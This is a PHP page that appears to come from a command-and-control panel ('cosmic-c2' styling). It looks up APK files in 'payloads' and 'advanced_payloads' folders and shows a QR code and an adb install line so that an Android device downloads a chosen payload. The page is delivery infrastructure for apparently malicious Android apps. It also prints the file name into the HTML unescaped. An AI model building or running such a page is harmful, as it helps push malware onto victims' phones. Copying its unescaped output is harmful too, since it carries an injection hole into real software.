<?php
require_once __DIR__ . '/includes/security_functions.php';
$file = $_GET['file'] ?? '';
if (!$file) die('No file specified.');
$file = basename($file);
$apkPath = dirname(__DIR__) . '/data/payloads/' . $file;
if (!file_exists($apkPath)) $apkPath = dirname(__DIR__) . '/data/advanced_payloads/' . $file;
if (!file_exists($apkPath)) die('APK not found.');
$downloadUrl = '/download.php?file=' . urlencode($file);
$qrCode = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' . urlencode('http://' . $_SERVER['HTTP_HOST'] . $downloadUrl);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Install APK</title>
    <link rel="stylesheet" href="/assets/css/cosmic-c2.css">
</head>
<body>
    <div style="text-align:center; padding:50px;">
        <h1>Install Android APK</h1>
        <img src="<?php echo $qrCode; ?>" alt="QR Code">
        <p>Scan with your Android device to download.</p>
        <p>Or use ADB: <code>adb install <?php echo $file; ?></code></p>
        <p><a href="<?php echo $downloadUrl; ?>" class="btn">Download APK</a></p>
    </div>
</body>
</html>
